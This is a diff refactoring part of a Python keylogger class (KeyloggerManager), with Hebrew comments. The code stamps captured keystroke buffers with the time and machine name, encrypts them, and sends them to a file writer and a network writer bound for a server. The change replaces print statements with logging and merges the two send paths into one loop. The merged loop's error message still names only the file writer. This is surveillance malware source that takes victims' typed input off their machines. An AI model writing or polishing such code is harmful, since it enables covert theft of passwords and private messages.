@@ -80,28 +80,23 @@ class KeyloggerManager:
             data_with_timestamp = self._add_timestamp(raw_data)
             encrypted_data = self.encryptor.encrypt(data_with_timestamp)
             self._send_to_writers(encrypted_data)
-            print(f"Processed {len(raw_data)} characters")
+            logging.info(f"Processed {len(raw_data)} characters")
         except Exception as e:
-            print(f"Error processing buffer: {e}")
+            logging.error(f"Error processing buffer: {e}")
 
 # פונקציה שמוסיפה זמן
     def _add_timestamp(self, data: str) -> str:
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        print(data)
         return f"[{timestamp}] Machine: {self.machine_name}\n{data}\n{'='*50}\n"
 
 # פונקציה ששולחת לצד שרת
     def _send_to_writers(self, data: str) -> None:
-        if self.file_writer:
-            try:
-                self.file_writer.send_data(data, self.machine_name)
-            except Exception as e:
-                print(f"Error sending to file_writer: {e}")
-        if self.network_writer:
-            try:
-                self.network_writer.send_data(data, self.machine_name)
-            except Exception as e:
-                print(f"Error sending to network_writer: {e}")
+        for writer in [self.file_writer, self. network_writer]:
+            if writer:
+                try:
+                    writer.send_data(data, self.machine_name)
+                except Exception as e:
+                    logging.error(f"Error sending to file_writer: {e}")
 
 # פונקציה שבודקת אורך מידע
     def get_buffer_size(self) -> int:
@@ -117,7 +112,7 @@ class KeyloggerManager:
         if new_interval <= 0:
             raise ValueError("Interval must be positive")
         self.update_interval = new_interval
-        print(f"Update interval changed to {new_interval}s")
+        logging.info(f"Update interval changed to {new_interval}s")
         if self.is_running_flag and self.timer:
             self.timer.cancel()
             self._schedule_collection()
